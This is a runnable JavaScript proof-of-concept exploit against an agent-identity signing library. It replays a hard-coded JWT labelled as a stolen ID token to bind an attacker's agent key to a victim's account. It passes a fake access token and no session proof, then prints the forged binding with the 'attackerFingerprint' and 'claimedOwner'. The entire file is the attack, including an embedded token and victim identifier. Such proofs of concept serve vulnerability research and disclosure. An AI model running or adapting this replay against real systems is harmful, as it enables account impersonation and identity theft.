import { SignatureEngine } from "/Users/truehazker/Workspace/alien/agent-id/skills/alien-agent-id/lib.mjs";

const STOLEN_ID_TOKEN =
  "eyJhbGciOiJSUzI1NiIsImtpZCI6ImV5YjVOVGtfa3VnIiwidHlwIjoiSldUIn0." +
  "eyJpc3MiOiJodHRwczovL3Nzby5hbGllbi1hcGkuY29tIiwic3ViIjoiMDAwMDAwMDcwMTAwMDAwMDAwMDAyN2RmYmYzODZjMjUiLCJhdWQiOlsiMDAwMDAwMDYwNDAwMDAwMDAwMDAzNjE1OWIzYzBmMTUiXSwiZXhwIjoxNzc4NTQyNjYzLCJpYXQiOjE3NzU5NTA2NjMsImF1dGhfdGltZSI6MTc3NTk1MDY0N30." +
  "hqWcoYa-2yWVBXWe6tp3yNP4NERYrelUkHZUfeSGPuffTYbgvid9TaF33fgLONd2VbaZGJf8XqIOCI0J57kVpQgcbEgbnmMMkTU1FaDOLPp6qPbSLMHNsFZBrS55zG7DrZHwkOWvQdvZRBkV2ngmkRhtjZXuIbWFAdKDeWpW2pl_eMM5z1adq_GjsSx-U9QOmLDK9Dt4ZJMrzsQC-p6xwyoQDmPV_2b9zqN4PEf450KeB1wN9YLtd-PIiuQlBHVOHVQL2rrqUpYo9NlMoMMHe1-9_DfALK0nIFNayKrp6Crdyb3sgqcwYP4dUDwdzC1IBDNTJMHYrxe3a3uqN51d9w";

const VICTIM_ALIEN_ID = "0000000701000000000027dfbf386c25";
const PROVIDER_ADDRESS = "0000000604000000000036159b3c0f15";
const ISSUER = "https://sso.alien-api.com";

const engine = new SignatureEngine({ baseDir: process.env.AGENT_ID_STATE_DIR });
await engine.init();

const ownerRecord = await engine.bindOwnerSession({
  issuer: ISSUER,
  ssoBaseUrl: ISSUER,
  providerAddress: PROVIDER_ADDRESS,
  ownerSessionSub: VICTIM_ALIEN_ID,
  ownerAudience: [PROVIDER_ADDRESS],
  ownerProfileUrl: null,
  idToken: STOLEN_ID_TOKEN,
  accessToken: "FAKE_NOT_NEEDED",
  refreshToken: null,
  ownerSessionProof: null,
});

console.log(JSON.stringify({
  ok: true,
  bindingId: ownerRecord.binding.id,
  attackerFingerprint: ownerRecord.binding.payload.agentInstance.publicKeyFingerprint,
  claimedOwner: ownerRecord.binding.payload.ownerSessionSub,
  providerAddress: ownerRecord.binding.payload.providerAddress,
  idTokenHash: ownerRecord.binding.payload.idTokenHash,
}, null, 2));
